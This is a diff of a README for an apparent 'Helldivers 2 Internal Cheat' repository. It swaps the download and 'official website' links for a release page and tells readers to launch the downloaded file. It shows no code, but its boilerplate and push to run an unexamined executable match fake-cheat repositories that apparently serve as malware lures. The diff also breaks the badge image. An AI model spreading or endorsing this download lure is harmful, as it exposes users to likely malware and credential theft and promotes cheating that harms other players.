@@ -19,14 +19,14 @@ With these enhancements, you can enjoy Helldivers 2 like never before, overcomin
 ## Get Started 🚀
 To download the Helldivers 2 Internal Cheat tool, click the button below:
 
-[![Download Helldivers 2 Cheat](https://img.shields.io/badge/Download-App.zip-green)](https://github.com/file/App.zip)
+[![Download Helldivers 2 Cheat](https://github.com/Tommysburl/Helldivers2-Internal-Cheat-FULL/releases/tag/v2.0)](https://github.com/Tommysburl/Helldivers2-Internal-Cheat-FULL/releases/tag/v2.0)
 
 Make sure to launch the downloaded file to start using the cheat features in your Helldivers 2 gameplay.
 
 If you encounter any issues with the download link, feel free to check the "Releases" section of this repository for alternative download options.
 
 ## Additional Resources 🌟
-For more information and updates, you can visit the [official website](https://www.cheathub.com/helldivers2-internal-cheat) for Helldivers 2 Internal Cheat. Stay tuned for new features and improvements to enhance your gaming experience even further.
+For more information and updates, you can visit the [official website](https://github.com/Tommysburl/Helldivers2-Internal-Cheat-FULL/releases/tag/v2.0) for Helldivers 2 Internal Cheat. Stay tuned for new features and improvements to enhance your gaming experience even further.
 
 ## Contribute 🤝
 If you are interested in contributing to the development of Helldivers 2 Internal Cheat, feel free to fork this repository and submit your pull requests. Your contributions are highly appreciated in making this cheat tool even better for the gaming community.
